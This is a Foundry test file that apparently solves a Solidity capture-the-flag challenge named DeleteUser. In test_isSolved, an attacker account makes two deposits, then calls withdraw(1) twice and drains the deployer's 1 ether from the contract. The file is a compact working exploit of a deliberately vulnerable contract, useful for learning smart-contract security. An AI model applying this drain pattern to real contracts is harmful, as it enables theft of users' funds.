// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {DeployDeleteUserScript} from "@script/8_DeployDeleteUser.s.sol";
import {DeleteUser} from "@main/DeleteUser.sol";

contract DeleteUserTest is Test, DeployDeleteUserScript {

    string mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

    address deployer = vm.addr(deployerPrivateKey);
    address public attacker = address(11);

    function setUp() public {
        vm.deal(attacker, 3 ether);
        vm.label(attacker, "Attacker");

        vm.deal(deployer, 1 ether);

        DeployDeleteUserScript.run();
       
    }

    modifier beforeEach() {
        vm.startPrank(deployer);
        
        assertEq(address(deleteUserChallenge).balance , 0 ether);
        deleteUserChallenge.deposit{value : 1 ether}();
        assertEq(address(deleteUserChallenge).balance , 1 ether);

        vm.stopPrank(  );
        _;
    }

    function test_isSolved() public beforeEach {
        vm.startPrank(attacker);

        assertEq( address(deleteUserChallenge).balance, 1 ether );
        assertEq( address(attacker).balance, 3 ether );

        deleteUserChallenge.deposit{value: 2 ether}();
        deleteUserChallenge.deposit{value: 1 ether}();

        deleteUserChallenge.withdraw(1);
        deleteUserChallenge.withdraw(1);

        assertEq( address(deleteUserChallenge).balance, 0 );
        assertEq( address(attacker).balance, 4 ether );

        vm.stopPrank(  );
    }

}